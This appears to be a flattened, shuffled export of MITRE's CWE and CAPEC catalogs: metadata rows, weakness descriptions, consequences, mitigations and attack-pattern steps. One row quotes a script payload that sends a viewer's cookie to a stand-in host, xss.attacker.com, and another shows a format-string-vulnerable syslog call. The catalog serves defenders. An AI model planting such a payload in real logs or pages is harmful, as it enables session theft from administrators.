7894	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
22629	103	Primary
10548	53	The MITRE Corporation
15633	21	CWE Content Team
8379	66	Automated Source Code Security Measure (ASCSM)
19317	101	CAPEC Content Team
13248	39	2017-11-08
16586	39	2009-05-27
13709	47	Other
13582	72	The contents of the array can be modified from outside the intended scope.
17735	67	High
13843	28	CWE Content Team
19182	78	High
15628	62	updated Related_Attack_Patterns, Type
23106	25	Low
18040	31	699
20897	104	268
8586	28	CWE Content Team
22084	90	Language-Independent
9836	62	updated Taxonomy_Mappings
20923	48	10
13819	62	updated Relationships, Taxonomy_Mappings
17920	31	1000
22281	76	2017-08-04
12937	33	Brett Moore
15893	62	updated Common_Consequences
16611	74	2
21892	81	Confidentiality
10595	39	2011-06-01
8003	66	Top 25 Series - Rank 4 - Cross Site Request Forgery
24890	103	Primary
14632	95	Attacker determines the underlying system thread that is subject to user-control
19895	54	High
10581	62	updated Demonstrative_Examples, Relationships
11871	62	updated Potential_Mitigations
15698	100	The MITRE Corporation
9497	56	CanPrecede
6074	79	Confidentiality
17440	61	Draft
20516	49	2013
6129	103	Primary
20535	73	Identify trusted associates, colleagues and friends of target. See also: CAPEC-118.
18053	42	If possible, ensure that all external commands called from the program are statically created.
14168	55	CAPEC Content Team
17774	35	MITRE
17113	55	CAPEC Content Team
24044	48	09
22900	90	Language-Independent
17924	35	MITRE
17917	28	CWE Content Team
23524	101	CAPEC Content Team
17801	56	ChildOf
8341	39	2009-12-28
18103	39	2014-02-18
15562	40	The application should accepts and decodes URL input.
9865	35	MITRE
12277	81	Confidentiality
23165	56	ChildOf
17655	62	updated Potential_Mitigations
10450	28	CWE Content Team
9911	39	2019-06-20
15757	103	Primary
22543	48	09
13314	62	updated Potential_Mitigations
14179	35	MITRE
18558	79	Confidentiality
6080	35	MITRE
11579	50	Design: Proxy communication to host, so that communications are terminated at the proxy, sanitizing the requests before forwarding to server host.
9542	62	added/updated demonstrative examples
11084	66	Remote and Local Exploitation of Network Drivers
11395	79	Confidentiality
14506	104	155
24341	28	CWE Content Team
18754	77	Automated Static Analysis
11763	62	updated Relationships
20735	62	updated Relationships
15032	28	CWE Content Team
16568	92	Exploit
18429	46	This weakness covers three distinct situations. A "missing" protection mechanism occurs when the application does not define any mechanism against a certain class of attack. An "insufficient" protection mechanism might provide some defenses - for example, against the most common attacks - but it does not protect against everything that is intended. Finally, an "ignored" mechanism occurs when a mechanism is available and in active use within the product, but the developer has not applied it in some code path.
15939	62	updated Demonstrative_Examples
9831	56	PeerOf
22602	42	If circumstances force you to run with extra privileges, then determine the minimum access level necessary. First identify the different permissions that the software and its users will need to perform their actions, such as file read and write permissions, network socket permissions, and so forth. Then explicitly allow those actions while denying all else [REF-76]. Perform extensive input validation and canonicalization to minimize the chances of introducing a separate vulnerability. This mitigation is much more prone to error than dropping the privileges in the first place.
21126	67	High
6905	66	Why Python Pickle is Insecure
18339	43	Simple
23149	28	CWE Content Team
12360	88	Improper Handling of Incomplete Structural Elements
14672	89	Detailed
24601	71	2003
14218	28	CWE Content Team
9373	47	Read Data
7356	70	Analyzing Inter-Application Communication in Android
19126	86	http://marc.info/?l=bugtraq&m=109525864717484&w=2
19198	62	updated Description, Relationships
23065	92	Explore
13550	50	Design: Utilize defense in depth, do not rely on a single security mechanism like SSL
24979	28	CWE Content Team
7441	76	2017-08-04
16128	35	Cigital
11397	63	Reduce Maintainability
9308	28	CWE Content Team
20717	62	updated Time_of_Introduction
6771	104	220
19749	69	Draft
8230	76	2017-08-04
13325	35	MITRE
22672	35	MITRE
14733	103	Primary
9769	23	The software does not properly restrict reading from or writing to dynamically-identified variables.
10816	28	CWE Content Team
11482	81	Integrity
9654	89	Detailed
21187	28	CWE Content Team
21637	88	Improper Neutralization of Quoting Syntax
17032	55	CAPEC Content Team
7238	39	2008-07-01
7136	28	CWE Content Team
13679	89	Standard
25376	31	1000
7579	62	updated Demonstrative_Examples, References, Relationships, Taxonomy_Mappings
8525	35	MITRE
12020	39	2008-10-14
18841	61	Draft
13084	39	2017-11-08
9562	44	High
15573	35	MITRE
17547	35	MITRE
8291	63	Bypass Protection Mechanism
12145	50	Design: Validate all log data before it is output
10069	27	This varies depending on the resources necessary to corrupt the configuration file and the resources needed to force the application to re-read it (if any).
18149	56	ChildOf
20373	35	MITRE
18135	101	CAPEC Content Team
6599	63	Modify Application Data
14886	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
16718	62	updated Applicable_Platforms
17431	103	Primary
24684	77	Manual Static Analysis - Source Code
21208	26	Operation
11740	91	Architecture and Design
6891	28	CWE Content Team
7652	35	MITRE
11140	28	CWE Content Team
8354	35	MITRE
7503	68	This is not necessarily a complete solution, since these mechanisms can only detect certain types of overflows. In addition, an attack could still cause a denial of service, since the typical response is to exit the application.
13000	35	MITRE
20618	50	A software system should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary.
16178	31	1000
10220	62	updated Relationships
14295	62	updated Relationships
11596	43	Simple
17676	45	Variant
7908	43	Simple
24757	28	Sean Eidemiller
21475	35	MITRE
7269	69	Draft
14558	28	CWE Content Team
9698	39	2008-10-14
19048	39	2015-12-07
13337	28	CWE Content Team
15811	62	updated Relationships
24682	23	An attacker leverages a tool, device, or program to obtain specific information as provided by a user of the target system. This information is often needed by the attacker to launch a follow-on attack. This attack is different than Social Engineering as the adversary is not tricking or deceiving the user. Instead the adversary is putting a mechanism in place that captures the information that a user legitimately enters into a system. Deploying a keylogger, performing a UAC prompt, or wrapping the Windows default credential provider are all examples of such interactions.
13018	31	1000
8382	39	2012-05-11
23023	53	The MITRE Corporation
24862	39	2009-07-27
5591	28	Eric Dalci
24294	28	CWE Content Team
5778	100	The MITRE Corporation
7770	50	This attack may be mitigated through egress filtering based on ICMP payload so a network is a "good neighbor" to other networks. Bad IP implementations become patched, so using the proper version of a browser or OS is recommended.
22753	28	Eric Dalci
24465	56	PeerOf
9875	103	Primary
20746	62	updated Demonstrative_Examples
12247	39	2018-03-27
9673	56	ChildOf
8893	43	Simple
8095	28	CWE Content Team
11927	28	CWE Content Team
9465	103	Primary
6455	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, glibc in Linux provides protection against free of invalid pointers.
18186	62	updated Relationships
8495	28	Eric Dalci
19538	69	Incomplete
22560	62	updated Relationships, Taxonomy_Mappings
21441	62	updated Common_Consequences
19398	62	updated Common_Consequences
15302	26	Architecture and Design
13077	28	CWE Content Team
20614	28	CWE Content Team
11485	73	The attacker creates a trap session for the victim.
9841	40	The target must be using a zone-aware browser.
23365	79	Authentication
22490	39	2011-06-01
12605	31	1000
24127	72	Attackers may be able to obtain sensitive information.
21337	26	Implementation
13976	43	Simple
8966	78	Low
11071	28	CWE Content Team
7617	28	CWE Content Team
10474	35	MITRE
8105	81	Integrity
23988	28	Eric Dalci
23088	79	Confidentiality
17907	81	Availability
20377	59	Updated Description Summary
9412	66	Web Application Firewall
14513	23	An adversary exploits a weakness enabling them to elevate their privilege and perform an action that they are not supposed to be authorized to perform.
17644	55	CAPEC Content Team
8835	103	Primary
23405	35	MITRE
21886	62	updated References, Relationships, Taxonomy_Mappings
11403	39	2011-06-27
25035	79	Confidentiality
5739	62	updated Relationships, Taxonomy_Mappings
10035	35	MITRE
12844	57	Primary
24234	85	52
21620	62	updated Applicable_Platforms
8249	89	Detailed
14090	51	2014-06-23
15915	62	updated Relationships
17347	102	ChildOf
13736	78	Medium
15342	39	2010-06-21
9604	47	Hide Activities
12782	39	2019-01-03
17308	31	699
20976	63	Read Application Data
23643	102	ChildOf
22286	23	Some APIs will strip certain leading characters from a string of parameters. An adversary can intentionally introduce leading "ghost" characters (extra characters that don't affect the validity of the request at the API layer) that enable the input to pass the filters and therefore process the adversary's input. This occurs when the targeted API will accept input data in several syntactic forms and interpret it in the equivalent semantic way, while the filter does not take into account the full spectrum of the syntactic forms acceptable to the targeted API.
20234	76	2018-07-31
17993	28	CWE Content Team
6324	35	MITRE
16953	62	updated Relationships
17047	62	updated Common_Consequences, Demonstrative_Examples, Relationships, Taxonomy_Mappings
8969	100	The MITRE Corporation
20479	62	updated Taxonomy_Mappings
14154	34	Consider a product that consists of two or more processes or nodes that must interact closely, such as a client/server model. If the product uses protection schemes in the client in order to defend from attacks against the server, and the server does not use the same schemes, then an attacker could modify the client in a way that bypasses those schemes. This is a fundamental design flaw that is primary to many weaknesses.
8127	35	Cigital
17898	35	MITRE
15324	49	2012
23227	62	Suggested OWASP Top Ten 2004 mapping
17823	28	CWE Content Team
8851	45	Variant
10236	101	CAPEC Content Team
10874	85	394
5966	63	DoS: Resource Consumption (Memory)
13144	95	[Determine secret testing procedure] Determine how a potential guess of the secret may be tested. This may be accomplished by comparing some manipulation of the secret to a known value, use of the secret to manipulate some known set of data and determining if the result displays specific characteristics (for example, turning cryptotext into plaintext), or by submitting the secret to some external authority and having the external authority respond as to whether the value was the correct secret. Ideally, the attacker will want to determine the correctness of their guess independently since involvement of an external authority is usually slower and can provide an indication to the defender that a brute-force attack is being attempted.
5807	85	649
14148	96	2009-05-13
24069	81	Availability
15199	73	Manually inject various script payloads into each identified entry point using a list of common script injection probes and observe system behavior to determine if script was executed.
6001	89	Standard
14977	91	Requirements
12253	31	699
22813	56	ChildOf
20693	45	Base
15247	39	2012-05-11
11498	62	updated Description, Other_Notes
25293	50	Use safe libraries to access resources such as files.
19330	62	updated Common_Consequences
16367	43	Simple
22590	39	2019-01-03
18253	35	Veracode
9476	43	Simple
10213	39	2019-09-19
9739	28	CWE Content Team
8769	35	MITRE
5901	79	Integrity
12365	81	Availability
23355	39	2014-06-23
13314	35	Cigital
20403	39	2008-09-08
21780	39	2017-11-08
22903	35	MITRE
16688	97	Expanding Control over the Operating System from the Database
14124	46	Software has certain assumptions about what constitutes data and control respectively. It is the lack of verification of these assumptions for user-controlled input that leads to injection problems. Injection problems encompass a wide variety of issues -- all mitigated in very different ways and usually attempted in order to alter the control flow of the process. For this reason, the most effective way to discuss these weaknesses is to note the distinct features which classify them as injection weaknesses. The most important issue to note is that all injection problems share one thing in common -- i.e., they allow for the injection of control plane data into the user-controlled data plane. This means that the execution of the process may be altered by sending code in through legitimate data channels, using no other mechanism. While buffer overflows, and many other flaws, involve the use of some further issue to gain execution, injection problems need only for the data to be parsed. The most classic instantiations of this category of weakness are SQL injection and format string vulnerabilities.
9531	56	ChildOf
8433	44	High
20718	51	2014-06-23
9236	39	2011-09-13
23859	39	2017-11-08
24113	97	SOAP Array Overflow
20898	28	CWE Content Team
7583	43	Simple
12056	63	Read Files or Directories
15253	28	Eric Dalci
11179	73	Malicious code execution. An attacker introduces a malicious payload and executes arbitrary code on the target system.
21283	35	MITRE
24163	39	2009-03-10
14550	28	CWE Content Team
15982	62	updated Other_Notes, Relationships
18356	97	Relative Path Traversal
8522	26	Implementation
20413	56	ChildOf
8160	100	The MITRE Corporation
25067	45	Base
6419	50	Make the URLs in the system used to retrieve JSON objects unpredictable and unique for each user session.
20559	62	updated Common_Consequences
11645	27	None: No specialized resources are required to execute this type of attack.
21287	28	CWE Content Team
6031	32	The Wikimedia Foundation, Inc
14827	28	CWE Content Team
11816	62	updated Potential_Mitigations
12762	104	109
22979	95	[Exploit unpublished functions] Using information determined via experimentation, exploit the unpublished features of the service.
13296	31	1000
6448	47	Alter Execution Logic
14499	59	Updated References
6720	28	CWE Content Team
9860	76	2019-09-30
23670	62	updated Applicable_Platforms, Taxonomy_Mappings
21735	54	High
11781	45	Base
24443	55	CAPEC Content Team
21487	57	Indirect
24803	35	MITRE
21828	28	CWE Content Team
20523	43	Simple
20425	42	Setup default error messages so that unexpected errors do not disclose sensitive information.
22150	27	None: No specialized resources are required to execute this type of attack.
6895	39	2011-06-01
8648	103	Primary
5802	67	High
12596	28	CWE Content Team
6076	62	updated Observed_Examples
15487	100	The MITRE Corporation
7575	62	updated Description
10946	78	High
6857	62	updated Description
6819	91	Implementation
8534	28	CWE Content Team
8846	74	2
13290	23	The software reads or writes to a buffer using an index or pointer that references a memory location after the end of the buffer.
5943	35	MITRE
10441	79	Access Control
21718	103	Primary
7980	35	MITRE
17524	59	Updated Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Examples-Instances, Related_Attack_Patterns, Related_Vulnerabilities, Related_Weaknesses, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit
5640	92	Exploit
17235	62	updated Time_of_Introduction
9982	76	2019-04-04
8888	35	MITRE
21777	28	CWE Content Team
16763	103	Primary
12703	78	Low
23665	51	2014-06-23
8576	35	MITRE
17722	35	MITRE
10010	28	CWE Content Team
15016	28	CWE Content Team
14337	73	Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator's cookie and will be able to gain access as that user. For example, a log file entry could contain                   <script>new Image().src="http://xss.attacker.com/log_cookie?cookie="+encodeURI(document.cookie);</script>                   The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).
10112	35	MITRE
17443	28	CWE Content Team
14731	28	CWE Content Team
17102	28	Eric Dalci
24432	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
19057	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
21770	103	Primary
9180	100	The MITRE Corporation
9737	28	CWE Content Team
11390	39	2013-07-17
14087	96	2010-11-29
18148	91	Implementation
10059	35	MITRE
24104	39	2019-01-03
15629	53	The MITRE Corporation
14712	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
9471	35	MITRE
14261	62	updated Common_Consequences
20569	23	An attacker initiates cross domain HTTP / GET requests and times the server responses. The timing of these responses may leak important information on what is happening on the server. Browser's same origin policy prevents the attacker from directly reading the server responses (in the absence of any other weaknesses), but does not prevent the attacker from timing the responses to requests that the attacker issued cross domain. For GET requests an attacker could for instance leverage the "img" tag in conjunction with "onload() / onerror()" javascript events. For the POST requests, an attacker could leverage the "iframe" element and leverage the "onload()" event. There is nothing in the current browser security model that prevents an attacker to use these methods to time responses to the attackers' cross domain requests. The timing for these responses leaks information. For instance, if a victim has an active session with their online e-mail account, an attacker could issue search requests in the victim's mailbox. While the attacker is not able to view the responses, based on the timings of the responses, the attacker could ask yes / no questions as to the content of victim's e-mails, who the victim e-mailed, when, etc. This is but one example; There are other scenarios where an attacker could infer potentially sensitive information from cross domain requests by timing the responses while asking the right questions that leak information.
18203	102	ChildOf
6608	85	646
13209	101	CAPEC Content Team
10518	39	2014-07-30
19070	69	Draft
19150	89	Meta
21043	28	CWE Content Team
21707	35	MITRE
15274	39	2010-02-16
15059	35	MITRE
8569	35	MITRE
10122	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
20481	62	added/updated white box definitions
14921	76	2019-09-30
24970	71	2009
21398	103	Primary
24837	28	CWE Content Team
20586	55	CAPEC Content Team
15849	39	2014-07-30
18688	74	1
8818	92	Explore
9146	28	CWE Content Team
13389	62	updated Applicable_Platforms, Functional_Areas, Likelihood_of_Exploit, Relationships, Taxonomy_Mappings
16925	103	Primary
21280	26	Implementation
17214	62	updated Potential_Mitigations
23500	39	2008-09-08
20289	103	Primary
24344	35	MITRE
17490	62	updated Potential_Mitigations
17095	81	Confidentiality
17086	28	CWE Content Team
19899	81	Availability
17796	28	CWE Content Team
16017	91	Implementation
6064	44	SOAR Partial
14691	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
19196	72	Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy. This can often be used to subvert any other security service.
7908	90	Language-Independent
16597	30	John Koelndorfer
24040	39	2010-02-16
9149	39	2018-03-27
16151	61	Draft
9083	28	CWE Content Team
20687	76	2019-04-04
14745	45	Class
17738	49	2010
8483	34	The developer may set loose permissions in order to minimize problems when the user first runs the program, then create documentation stating that permissions should be tightened. Since system administrators and users do not always read the documentation, this can result in insecure permissions being left unchanged.
7144	91	Architecture and Design
15721	62	updated Name
18263	28	CWE Content Team
18728	34	This weakness may occur when software designers choose to not leverage input validation frameworks provided by the source language.
19785	79	Integrity
20714	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
19697	102	ChildOf
6272	61	Stable
11892	39	2017-01-19
6648	103	Primary
14232	60	09
25180	59	Updated Attack_Prerequisites, Description, Description Summary, References, Related_Weaknesses, Resources_Required, Solutions_and_Mitigations
6435	55	CAPEC Content Team
5685	31	1000
9162	86	http://projects.webappsec.org/Insufficient+Anti-automation
10339	39	2010-02-16
20217	39	2017-01-19
19790	53	The MITRE Corporation
7237	62	updated Description, Relationships, Other_Notes, Weakness_Ordinalities
10666	62	updated Time_of_Introduction
8354	62	updated Detection_Factors, References, Relationships
9727	39	2011-03-29
17849	59	Updated Related_Weaknesses
11782	63	Bypass Protection Mechanism
13344	28	CWE Content Team
19666	102	ChildOf
15950	56	ChildOf
23128	39	2011-06-01
23193	62	updated Relationships, Taxonomy_Mappings
6693	62	updated Common_Consequences
19626	31	1000
8791	28	Eric Dalci
23537	43	Simple
9888	69	Incomplete
23484	62	updated Potential_Mitigations
23386	53	The MITRE Corporation
21593	28	CWE Content Team
9014	35	MITRE
15375	103	Primary
10887	28	CWE Content Team
6923	96	2013-01-26
19423	35	MITRE
20875	44	High
16680	39	2014-07-30
21855	62	updated References, Relationship_Notes
19273	61	Draft
16717	28	CWE Content Team
22930	62	updated Relationships, Taxonomy_Mappings
11428	35	MITRE
25014	92	Experiment
13512	92	Exploit
17504	28	CWE Content Team
20197	101	CAPEC Content Team
12558	31	1000
16674	35	MITRE
8309	100	The MITRE Corporation
8611	62	updated Demonstrative_Examples
7000	35	MITRE
13912	50	To mitigate this type of attack, physical security techniques such as locks doors, alarms, and monitoring of targets should be implemented.
21727	56	ChildOf
19459	62	updated Description, Potential_Mitigations, Related_Attack_Patterns
12693	53	The MITRE Corporation
11445	39	2019-01-03
18553	85	188
9386	62	updated Relationships, Taxonomy_Mappings
8974	39	2013-02-21
10795	90	C++
12954	81	Access Control
21210	42	Perform whitelist input validation at entry points and also before consuming the resources. Reject bad file names rather than trying to cleanse them.
8347	35	Cigital
19797	86	http://en.wikipedia.org/wiki/Optimal_Asymmetric_Encryption_Padding
23312	35	MITRE
7343	39	2008-10-03
18700	62	updated Potential_Mitigations
13467	91	Implementation
20459	27	None: No specialized resources are required to execute this type of attack.
23088	79	Access Control
15938	39	2011-06-01
25049	31	1000
22241	35	MITRE
22376	28	CWE Content Team
16355	46	If an attacker can guess (or knows) the seed, then the attacker may be able to determine the random numbers that will be produced from the PRNG.
8446	102	CanPrecede
21226	93	Moderate
13922	73	Use tools to crawl WSDL
12708	35	MITRE
20616	62	updated Relationships, Taxonomy_Mappings
11478	62	updated Relationships
6926	63	DoS: Resource Consumption (Other)
8201	28	CWE Content Team
23804	79	Confidentiality
25067	69	Incomplete
16059	31	1000
17288	103	Primary
20249	88	Improper Encoding or Escaping of Output
9917	59	Updated Related_Attack_Patterns
12725	62	updated Relationships
9560	53	The MITRE Corporation
13731	63	Unexpected State
8979	47	Read Data
13267	91	Implementation
6669	28	CWE Content Team
8575	50	Authenticate all servers and perform redundant checks when using DNS hostnames.
10368	28	CWE Content Team
15007	86	http://blogs.sans.org/appsecstreetfighter/2010/04/05/top-25-series-rank-20-download-code-integrity-check/
12951	39	2014-07-30
19345	35	MITRE
7859	50	Design: Enforce principle of least privilege
18378	104	345
18022	79	Availability
8998	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
13723	73	Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site
23400	28	CWE Content Team
5701	100	The MITRE Corporation
16512	62	updated Alternate_Terms, Applicable_Platforms, Demonstrative_Examples, Description, Name, References
15499	39	2008-09-08
14392	80	To issue the request to URL without given a specific file name
25267	21	PLOVER
6670	39	2008-09-08
21469	28	CWE Content Team
9270	96	2009-05-13
22986	35	MITRE
7248	28	CWE Content Team
16634	91	Requirements
9721	39	2009-07-17
22298	100	The MITRE Corporation
8784	35	MITRE
20261	92	Exploit
12918	39	2008-09-08
23600	35	MITRE
20104	62	updated Description, Observed_Examples, Related_Attack_Patterns
6951	28	CWE Content Team
6893	35	MITRE
22065	88	Improper Handling of Missing Values
20572	62	updated Time_of_Introduction
5749	39	2017-11-08
12718	89	Standard
24763	62	updated Potential_Mitigations
23300	35	MITRE
18725	31	1000
18869	28	CWE Content Team
23929	55	CAPEC Content Team
14320	26	Implementation
20968	59	Updated Description Summary
15036	28	CWE Content Team
7806	92	Experiment
9482	100	The MITRE Corporation
19678	35	MITRE
16063	56	ChildOf
16796	47	Execute Unauthorized Commands
24968	74	6
15631	62	updated Demonstrative_Examples
25422	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.
17004	90	Language-Independent
21086	91	Operation
20282	79	Authorization
7291	62	updated References
20493	31	1000
10985	62	updated Demonstrative_Examples
8817	103	Primary
16194	42	Use only SSL communication.
24684	44	High
15626	97	Buffer Overflow in Local Command-Line Utilities
25155	81	Integrity
16694	35	MITRE
24121	39	2012-10-30
7327	21	PLOVER
7265	39	2014-07-30
17338	35	MITRE
9623	90	C++
8503	44	SOAR Partial
19818	61	Draft
8382	35	MITRE
9559	71	2008
12238	35	Cigital
22476	94	Run Arbitrary Code
10775	56	ChildOf
22857	101	CAPEC Content Team
23990	39	2011-06-01
8211	88	Improper Neutralization of Special Elements
12673	63	Read Application Data
11396	63	Bypass Protection Mechanism
13377	62	updated Related_Attack_Patterns
15630	28	CWE Content Team
21410	103	Primary
24726	23	The program violates secure coding principles for mobile code by declaring a finalize() method public.
21551	43	Simple
8912	62	updated Common_Consequences
6896	35	MITRE
24931	101	CAPEC Content Team
10141	72	This weakness may lead to unexpected system state, resulting in unpredictable behavior.
13928	28	Eric Dalci
13887	31	1000
20490	39	2009-03-10
15014	28	CWE Content Team
11235	81	Integrity
8050	81	Other
18803	77	Automated Dynamic Analysis
9179	88	Cleartext Storage in a File or on Disk
20475	35	MITRE
18061	21	CLASP
14430	63	Bypass Protection Mechanism
23665	55	CAPEC Content Team
14602	77	Automated Static Analysis - Binary or Bytecode
15762	26	Implementation
25067	105	Mobile
7822	62	updated Related_Attack_Patterns
12569	35	MITRE
20308	35	MITRE
12641	28	CWE Content Team
9752	90	Language-Independent
24846	91	Implementation
5991	77	Automated Static Analysis
22638	100	The MITRE Corporation
12825	92	Explore
7982	28	CWE Content Team
23813	62	updated Description, Relationships, Other_Notes
18888	39	2011-06-27
19815	21	Pascal Meunier
19106	76	2018-07-31
17106	28	Eric Dalci
8960	35	MITRE
8959	69	Incomplete
13481	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
21051	79	Access Control
19946	28	CWE Content Team
22966	53	The MITRE Corporation
6660	28	CWE Content Team
21239	101	CAPEC Content Team
6337	88	Expected Behavior Violation
12757	89	Detailed
6390	50	Implementation: Perform output validation for all remote content.
7475	23	In this attack, the target software is given input that the attacker knows will be modified and expanded in size during processing. This attack relies on the target software failing to anticipate that the expanded data may exceed some internal limit, thereby creating a buffer overflow.
24299	31	1000
21797	35	MITRE
6640	35	MITRE
11409	91	Implementation
13336	45	Base
22589	47	Gain Privileges
13735	93	Moderate
14160	62	updated Relationships, Taxonomy_Mappings
24708	62	updated Time_of_Introduction
10152	39	2014-02-18
18302	48	01
6029	95	[Determine application's/system's password policy] Determine the password policies of the target application/system.
17041	35	MITRE
18787	45	Base
21303	100	The MITRE Corporation
22419	80	How to poison a file with malicious payload that will exploit a vulnerability when the file is opened. The adversary must also know how to place the file onto a system where it will be opened by an unsuspecting party, or force the file to be opened.
16548	35	MITRE
5771	39	2009-07-27
18277	63	Read Application Data
20603	39	2014-07-30
7979	28	CWE Content Team
20265	35	MITRE
25177	28	CWE Content Team
22779	26	Implementation
20580	35	MITRE
21434	35	MITRE
8845	53	The MITRE Corporation
10325	39	2015-12-07
8412	62	updated Description, Potential_Mitigations
10918	56	ChildOf
22523	28	CWE Content Team
24554	39	2009-05-27
18271	35	MITRE
23830	35	MITRE
17700	62	updated Potential_Mitigations, References, Relationships, Taxonomy_Mappings
16022	35	MITRE
21925	46	While XSS might seem simple to prevent, web browsers vary so widely in how they parse web pages, that a blacklist cannot keep track of all the variations. The "XSS Cheat Sheet" [REF-564] contains a large number of attacks that are intended to bypass incomplete blacklists.
8819	57	Indirect
16395	35	MITRE
10174	26	Implementation
12811	40	The target program consumes user-controllable data in the form of tags or variables.
23722	69	Incomplete
12125	44	High
15015	62	updated Background_Details, Relationships, Other_Notes, Relationship_Notes, Taxonomy_Mappings, Weakness_Ordinalities
10279	79	Authorization
7370	91	Architecture and Design
19565	91	Architecture and Design
21651	35	MITRE
24676	63	Execute Unauthorized Code or Commands
7038	35	MITRE
23118	35	MITRE
19140	73	Obtain user account in system and attempt to lock it out by sending malformed or incorrect data repeatedly
5868	74	2
21182	39	2010-06-21
12828	91	Architecture and Design
15626	40	The target host exposes a command-line utility to the user.
24166	81	Confidentiality
24663	76	2018-07-31
12026	103	Primary
16049	31	699
17591	72	When allocating resources without limits, an attacker could prevent all other processes from accessing the same type of resource.
7638	81	Integrity
8489	56	ChildOf
12518	35	MITRE
21574	28	Eric Dalci
18996	63	Other
10932	31	699
6218	50	The code should be reviewed for misuse of the Syslog function call. Manual or automated code review can be used. The reviewer needs to ensure that all format string functions are passed a static string which cannot be controlled by the user and that the proper number of arguments are always sent to that function as well. If at all possible, do not use the %n operator in format strings. The following code shows a correct usage of Syslog():                syslog(LOG_ERR, "%s", cmdBuf);                The following code shows a vulnerable usage of Syslog():                syslog(LOG_ERR, cmdBuf);                      // the buffer cmdBuff is taking user supplied data.
16305	45	Variant
12388	28	CWE Content Team
9221	91	Implementation
7392	26	Implementation
13804	62	updated Relationships
9687	88	Unnecessary Complexity in Protection Mechanism (Not Using 'Economy of Mechanism')
13767	26	Architecture and Design
15196	50	If possible, make use of SSL.
17486	62	updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, Potential_Mitigations, References, Relationships, Taxonomy_Mappings
10208	62	updated Description, Name
16890	42	Ensure that certificates are checked for revoked status.
23154	89	Detailed
20402	73	Add logic to the LDAP query to change the meaning of that command. Automated tools could be used to generate the LDAP injection strings.
9841	97	Cross Zone Scripting
24401	86	https://cloudblogs.microsoft.com/microsoftsecure/2012/08/30/microsofts-free-security-tools-banned-h/y
15121	23	Thread management in a Web application is forbidden in some circumstances and is always highly error prone.
8083	61	Draft
14953	94	DoS: resource consumption (other)
13764	81	Confidentiality
24720	39	2014-07-30
25241	26	Implementation
12047	103	Primary
16487	62	updated Related_Attack_Patterns
23975	35	MITRE
23882	56	ChildOf
19717	77	Manual Analysis
7786	76	2017-01-09
9339	39	2011-03-29
15760	28	CWE Content Team
9355	23	The software does not properly encode or decode the data, resulting in unexpected values.
15828	39	2012-05-11
7044	31	1000
18938	103	Primary
16659	31	1000
22154	79	Authorization
13260	31	699
6549	62	updated Potential_Mitigations, Time_of_Introduction
